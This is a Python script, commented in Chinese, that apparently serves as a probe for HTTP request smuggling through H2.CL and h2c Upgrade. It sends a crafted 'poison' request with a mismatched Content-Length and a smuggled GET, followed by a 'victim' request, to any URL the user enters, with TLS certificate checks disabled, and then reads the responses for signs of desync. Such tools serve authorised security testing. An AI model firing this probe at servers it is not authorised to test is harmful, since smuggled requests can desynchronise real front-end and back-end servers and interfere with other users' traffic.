#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket
import ssl
import time
from urllib.parse import urlparse


DEFAULT_TARGET = "https://example.com/"
DEFAULT_PATH = "/"

TIMEOUT_CONNECT = 8
TIMEOUT_READ = 5
SLEEP_BETWEEN = 0.5


def parse_target(user_input):
    """解析目标 URL，返回 host、port、sni、host header、path、是否 TLS"""
    target = user_input.strip() or DEFAULT_TARGET

    if "://" not in target:
        target = "https://" + target

    parsed = urlparse(target)

    if parsed.scheme not in ("http", "https"):
        raise ValueError("只支持 http 或 https URL")

    if not parsed.hostname:
        raise ValueError("无法解析 hostname")

    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == "https" else 80)

    path = parsed.path or DEFAULT_PATH
    if parsed.query:
        path += "?" + parsed.query

    hosthdr = parsed.netloc

    if "@" in hosthdr:
        hosthdr = hosthdr.rsplit("@", 1)[1]

    if hosthdr.endswith(f":{port}") and (
        (port == 80 and parsed.scheme == "http")
        or (port == 443 and parsed.scheme == "https")
    ):
        hosthdr = hosthdr.rsplit(":", 1)[0]

    use_tls = parsed.scheme == "https"

    return host, port, host, hosthdr, path, use_tls


def make_socket(host, port, sni, use_tls=True):
    """创建 TCP/TLS socket"""
    raw = socket.create_connection((host, port), timeout=TIMEOUT_CONNECT)

    if not use_tls:
        return raw

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    return ctx.wrap_socket(raw, server_hostname=sni)


def recv_all(sock):
    """读取响应直到连接关闭或超时"""
    data = b""

    while True:
        try:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
        except socket.timeout:
            break

    return data


def build_poison(hosthdr, base_path):
    """构造 H2.CL / h2c Upgrade 请求走私探测报文"""
    smuggled_path = "/smuggled-h2cl"

    poison = (
        f"POST {base_path} HTTP/1.1\r\n"
        f"Host: {hosthdr}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: 4\r\n"
        f"Upgrade: h2c\r\n"
        f"HTTP2-Settings: AAMAAABkAAQAAP__\r\n"
        f"Connection: Upgrade, HTTP2-Settings\r\n"
        f"\r\n"
        f"x=1"
        f"GET {smuggled_path} HTTP/1.1\r\n"
        f"Host: {hosthdr}\r\n"
        f"\r\n"
    )

    return poison


def build_victim(hosthdr, base_path):
    """构造 victim 请求"""
    victim = (
        f"GET {base_path} HTTP/1.1\r\n"
        f"Host: {hosthdr}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    )

    return victim


def send_probe(host, port, sni, hosthdr, base_path, use_tls=True):
    """执行单次 H2.CL 探测，返回 poison、victim 和原始响应"""
    sock = make_socket(host, port, sni, use_tls)
    sock.settimeout(TIMEOUT_READ)

    poison = build_poison(hosthdr, base_path)
    victim = build_victim(hosthdr, base_path)

    try:
        sock.sendall(poison.encode("iso-8859-1"))
        time.sleep(SLEEP_BETWEEN)
        sock.sendall(victim.encode("iso-8859-1"))

        data = recv_all(sock)
    finally:
        sock.close()

    return poison, victim, data


def analyze_response(data):
    """简单分析响应是否存在 H2.CL / h2c desync 迹象"""
    if not data:
        return "NO_RESPONSE / TIMEOUT - 连接可能被挂起，可能存在 desync 或后端阻塞"

    text = data.decode(errors="replace")
    indicators = []

    status_lines = [line for line in text.split("\r\n") if line.startswith("HTTP/")]
    if len(status_lines) >= 2:
        indicators.append(f"检测到 {len(status_lines)} 个 HTTP 响应 - 存在响应错位可能")

    if "101 Switching Protocols" in text:
        indicators.append("服务端接受 h2c Upgrade - 需要重点关注前后端协议切换处理")

    if "/smuggled-h2cl" in text or "smuggled-h2cl" in text:
        indicators.append("smuggled 路径出现在响应中 - 存在 H2.CL 请求走私迹象")

    abnormal_codes = ["400", "403", "404", "408", "421", "502", "503"]
    if any(f" {code} " in text for code in abnormal_codes):
        indicators.append("收到异常状态码 - 可能存在前端/后端解析分歧")

    if not indicators:
        return "无明显异常 - 前后端解析可能一致，或目标不支持 h2c Upgrade"

    return "; ".join(indicators)


def print_request(title, raw):
    sep = "=" * 60
    print(f"{sep}")
    print(f"- {title}")
    print(f"{sep}")
    print(raw.replace("\r\n", "\n"))


def main():
    print("=== H2.CL / h2c HTTP Request Smuggling 探测工具 ===")
    user_input = input(f"输入目标 URL (直接回车使用默认 {DEFAULT_TARGET}): ").strip()

    try:
        host, port, sni, hosthdr, base_path, use_tls = parse_target(user_input)
    except ValueError as e:
        print(f"[!] 输入错误: {e}")
        return

    print(f"[*] 目标: {host}:{port}  TLS: {use_tls}  基准路径: {base_path}")
    print(f"[*] SNI: {sni}  Host头: {hosthdr}")
    print()

    try:
        poison, victim, data = send_probe(
            host=host,
            port=port,
            sni=sni,
            hosthdr=hosthdr,
            base_path=base_path,
            use_tls=use_tls,
        )
        err = None
    except (socket.error, OSError, ssl.SSLError) as e:
        poison = build_poison(hosthdr, base_path)
        victim = build_victim(hosthdr, base_path)
        data = b""
        err = str(e)

    sep = "=" * 60

    print_request("Poison 请求", poison)
    print_request("Victim 请求", victim)

    print(f"{sep}")
    print("- 响应")
    print(f"{sep}")

    if err:
        print(f"[ERROR] {err}")
    elif data:
        print(data.decode(errors="replace").replace("\r\n", "\n"))
    else:
        print("[空响应]")

    print(f"{sep}")
    print("- 分析结论")
    print(f"{sep}")

    if err:
        print("连接或 TLS 阶段失败，未完成 H2.CL 探测")
    else:
        print(analyze_response(data))

    print(sep)


if __name__ == "__main__":
    main()
